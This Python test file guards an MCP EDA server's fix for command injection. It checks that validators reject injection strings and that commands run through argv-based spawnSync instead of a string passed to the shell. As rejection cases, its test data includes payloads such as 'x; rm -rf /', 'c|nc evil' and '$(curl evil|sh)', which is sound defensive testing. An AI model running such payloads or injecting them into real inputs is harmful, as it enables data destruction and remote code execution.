#!/usr/bin/env python3
"""Command-injection hardening regression guard.

Before v0.114.6 the MCP EDA server built every shell command by string-
interpolating caller-supplied params (module names, file paths, project dirs)
and ran it via `execSync("docker exec C bash -c \\"" + cmd.replace(/"/g,'\\"')
+ "\\"")` — escaping ONLY double quotes. A value such as
`top_module = 'x; rm -rf /foss'` could break out and execute arbitrary shell,
on the HOST for the FPGA / doc-extract / DB tools.

This test locks in three properties:
  1. The pure validators in src/lib/shell_safety.mjs reject injection payloads
     and accept legitimate paths/identifiers (behavioural, run via node).
  2. dockerExec no longer uses the vulnerable `bash -c "${cmd.replace(/"/g`
     escape pattern — it dispatches via an argv-based spawnSync.
  3. The HOST-executing handlers run their tools via argv (_spawnSync), and
     the shell-executing handlers validate their inputs at entry.
"""
import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

MCP_ROOT = Path(__file__).resolve().parents[1]
INDEX_JS = MCP_ROOT / "src" / "index.js"
SAFETY_MJS = MCP_ROOT / "src" / "lib" / "shell_safety.mjs"
SRC = INDEX_JS.read_text()

_NODE = shutil.which("node")


def _slice(tool_name: str, span: int = 4000) -> str:
    idx = SRC.find(f'"{tool_name}"')
    assert idx > 0, f"tool {tool_name} not found in index.js"
    return SRC[idx: idx + span]


# ── 1. behavioural: the validators actually reject injection ────────────────

@pytest.mark.skipif(_NODE is None, reason="node not installed")
def test_validators_reject_injection_and_accept_legit():
    script = r"""
import { assertSafePath, assertSafeIdent, assertSafeToken, shq }
  from "%s";
let fail = 0;
const expectThrow = (fn, v, label) => {
  let threw = false; try { fn(v, "x"); } catch (e) { threw = true; }
  if (!threw) { fail++; console.log("DID NOT REJECT", label, JSON.stringify(v)); }
};
const expectOk = (fn, v, label) => {
  let threw = false; try { fn(v, "x"); } catch (e) { threw = true; }
  if (threw) { fail++; console.log("WRONGLY REJECTED", label, JSON.stringify(v)); }
};
// path injection payloads
for (const p of ["x; rm -rf /", "a$(touch /tmp/x)", "b`id`", "c|nc evil",
                 "d&whoami", "/tmp/a b", "f>g", "h<i", 'j"k', "l'm",
                 "n\nrm", "$(curl evil|sh)"]) {
  expectThrow(assertSafePath, p, "path");
}
// legitimate container/project paths must pass
for (const p of ["/work/rtl/top.v", "./out/synth_top.v", "../a/b-c_d.lib",
                 "/foss/pdks/gf180mcuD/x.lef"]) {
  expectOk(assertSafePath, p, "path");
}
// identifier injection payloads
for (const id of ["top; rm", "b`c`", "d$e", "top-module", "a)b", "x y"]) {
  expectThrow(assertSafeIdent, id, "ident");
}
for (const id of ["top_module", "_clk", "DTOP", "reset_n"]) {
  expectOk(assertSafeIdent, id, "ident");
}
// part/token allows '-' and '.' but not shell meta
expectOk(assertSafeToken, "xc7a35tcpg236-1", "token");
expectOk(assertSafeToken, "met1", "token");
for (const t of ["a;b", "x$(y)", "p q"]) expectThrow(assertSafeToken, t, "token");
// shq round-trips a single quote safely
if (shq("a'b") !== "'a'\\''b'") { fail++; console.log("shq wrong"); }
console.log("FAILCOUNT=" + fail);
process.exit(fail ? 1 : 0);
""" % SAFETY_MJS.as_posix()
    r = subprocess.run([_NODE, "--input-type=module", "-e", script],
                       capture_output=True, text=True, timeout=30)
    assert r.returncode == 0, f"validator behaviour failed:\n{r.stdout}\n{r.stderr}"
    assert "FAILCOUNT=0" in r.stdout


# ── 2. dockerExec no longer uses the vulnerable escape ──────────────────────

def test_dockerexec_uses_argv_spawn_not_bashc_escape():
    # The exact pre-fix pattern: bash -c "<cmd with only "-escaping>".
    assert 'bash -c "${cmd.replace(/"/g' not in SRC, (
        "dockerExec still uses the double-quote-only escape — reintroduces "
        "the command-injection vector"
    )
    # The fixed dispatch: an argv ARRAY ending in "bash", "-c", cmd, so `cmd`
    # reaches bash as one element with no intervening host shell.
    #
    # 2026-08-19: this used to pin one exact literal,
    # `_spawnSync("docker", ["exec", CONTAINER, "bash", "-c", cmd]`, which went
    # red the moment the argv grew an in-container `timeout` wrapper -- a
    # change that does not touch the injection property at all. A guard that
    # fails on a safe edit gets "fixed" by deleting it, so it now asserts the
    # PROPERTY: every argv dockerExec can build must terminate in bash -c cmd,
    # and no host shell may be reintroduced.
    i = SRC.find("function dockerExec(")
    assert i > 0
    body = SRC[i: i + 4000]
    tails = re.findall(r'"bash",\s*"-c",\s*cmd\s*\]', body)
    assert tails, (
        "dockerExec must dispatch via an argv array ending in bash -c cmd so "
        "cmd is passed verbatim with no intervening host shell"
    )
    assert '_spawnSync("docker"' in body, (
        "dockerExec must reach docker through _spawnSync (argv), not a shell"
    )
    for shelly in ("execSync(", "shell: true", "/bin/sh -c"):
        assert shelly not in body, (
            f"dockerExec reintroduced a host shell via {shelly!r}"
        )
    # Every argv branch must end that way -- one safe branch plus one unsafe
    # branch is still an injection vector.
    branches = re.findall(r'\[\s*"exec",\s*CONTAINER,(?:[^\]]*?)\]', body)
    assert branches, "no docker-exec argv found in dockerExec"
    for b in branches:
        assert re.search(r'"bash",\s*"-c",\s*cmd\s*$', b.rstrip("] \n")), (
            f"a dockerExec argv branch does not end in bash -c cmd: {b}"
        )


# ── 3. host-executing handlers run tools via argv + validate inputs ─────────

def test_fpga_compile_validates_and_runs_via_argv():
    w = _slice("eda_fpga_compile")
    assert "assertSafePath(project_dir" in w
    # builds an argv (bin + args) and runs it via spawnSync — not a shell string
    assert 'bin = "quartus_sh"' in w
    assert "_spawnSync(bin, args" in w
    assert "execSync(cmd" not in w  # old shell-string execution is gone


def test_fpga_program_vivado_writes_tcl_file_not_process_substitution():
    w = _slice("eda_fpga_program", span=9000)
    assert "-source <(echo" not in w, (
        "vivado program path must not use bash process-substitution under sh"
    )
    assert 'optPath(bit_file' in w


def test_doc_extract_runs_via_argv():
    w = _slice("eda_doc_extract")
    assert "assertSafePath(out_dir" in w
    assert "python3 ${programPath}" not in w
    assert '_spawnSync("python3", args' in w


def test_camera_led_diff_passes_paths_via_argv():
    # the python script must read image paths from sys.argv, not interpolate
    # them into the source, and must not run through a `python3 -c "..."` shell
    # string anywhere in the server.
    assert 'python3 -c "${py' not in SRC
    assert "cols_b, w = row_avg(before, led_y_pixel" in SRC
    assert '_spawnSync("python3",' in SRC


def test_phase23_audit_runs_gate_via_argv():
    w = _slice("eda_phase23_completion_audit")
    assert 'python3 "${gate}"' not in w
    assert '_spawnSync("python3", [gate, project_dir' in w


def test_oracle_dump_burns_via_argv():
    w = _slice("eda_oracle_bytewise_dump", span=9000)
    assert "quartus_pgm -m JTAG" not in w  # old shell string gone
    assert 'assertSafePath(args.oracle_sof_path' in w


@pytest.mark.parametrize("tool,needle", [
    ("eda_synth", "assertSafeIdent(top_module"),
    ("eda_lint", "assertSafePaths(verilog_files"),
    ("eda_pnr", "assertSafePath(netlist"),
    ("eda_sta", "assertSafeIdent(top_module"),
    ("eda_lvs", "assertSafePath(layout_netlist"),
    ("eda_drc_klayout", "assertSafePath(gds_file"),
    ("eda_analog_layout", "assertSafeIdent(block_name"),
    ("eda_fpga_adc_read", "assertSafePath(quartus_path"),
])
def test_handlers_guard_their_inputs(tool, needle):
    assert needle in _slice(tool), f"{tool} missing entry guard `{needle}`"
